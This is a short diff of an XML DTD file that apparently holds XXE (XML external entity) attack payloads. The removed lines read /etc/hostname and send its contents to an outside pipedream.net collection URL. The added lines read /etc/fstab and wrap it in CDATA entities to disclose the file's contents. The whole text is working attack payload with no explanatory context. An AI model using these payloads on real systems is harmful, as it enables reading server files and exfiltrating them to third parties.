@@ -1,4 +1,5 @@
-<!ENTITY % x SYSTEM "file:///etc/hostname">
-<!ENTITY % paramEntity "<!ENTITY % genEntity SYSTEM 'https://en6ho54cbucv.x.pipedream.net/?%x;'>">
-%paramEntity;
-%genEntity;
+<!ENTITY % file SYSTEM "file:///etc/fstab">
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % end "]]>">
+<!ENTITY % all "<!ENTITY fileContents 
+'%start;%file;%end;'>">
